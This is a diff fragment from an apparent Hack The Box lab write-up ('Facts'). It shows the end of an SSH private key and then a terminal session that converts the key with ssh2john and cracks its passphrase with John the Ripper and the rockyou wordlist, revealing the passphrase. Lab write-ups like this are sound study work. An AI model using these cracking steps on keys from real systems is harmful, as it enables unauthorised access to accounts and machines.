@@ -334,8 +334,23 @@ CuElUCi1hVBnYKQU6qrnYwHa2G5h4FvYKdQrOJzDfc3+0ICCwOkPPsVDP9XgFmSGTVys1r
 g4A1fVyrzdBmDIRtEdud2JwdrqWK3mBlvqZYw=
 -----END OPENSSH PRIVATE KEY-----
 
+then:
 
+ajdev@rootbox:~/HTB/Facts$ python3 ~/john/run/ssh2john.py ~/HTB/Facts/id_rsa > ~/HTB/Facts/id_rsa.hash
+ajdev@rootbox:~/john/run$ ./john ~/HTB/Facts/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
+Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 20 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+dragonballz      (/home/ajdev/HTB/Facts/id_rsa)
+1g 0:00:00:26 DONE (2026-02-03 16:13) 0.03723g/s 119.1p/s 119.1c/s 119.1C/s qwertyui..imissu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
 ```
+
+
 
 
 
